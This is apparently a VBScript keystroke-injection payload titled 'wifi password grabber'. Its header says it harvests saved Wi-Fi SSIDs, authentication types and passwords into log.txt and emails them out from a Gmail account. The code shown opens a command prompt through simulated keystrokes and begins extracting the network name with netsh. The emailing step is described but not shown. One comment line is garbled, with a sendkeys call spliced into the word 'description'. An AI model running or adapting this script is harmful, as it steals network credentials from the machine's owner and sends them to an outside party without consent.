set wshshell = wscript.createobject("wscript.shell")
set objshell = createobject("shell.application")
' title: wifi password grabber
' author: siem
' version: 3
' dwshshell.sendkeys("{esc}")ription: saves the ssid, network type, authentication and the password to log.txt and emails the contents of log.txt from a gmail account.")
wscript.sleep 3000

' --> minimize all windows

' --> open cmd
objShell.FileRun
wscript.sleep 500
wshshell.sendkeys(" cmd")
wshshell.sendkeys("{enter}")
wscript.sleep 1000

' --> getting ssid
wshshell.sendkeys(" cd ""{%}userprofile{%}\desktop"" & for /f ""tokens=2 delims=: "" {%}a in {(}{'}netsh wlan show interface {^}| findstr ""ssid"" {^}| findstr /v ""bssid""{'}{)} do set a={%}a")
wshshell.sendkeys("{enter}")
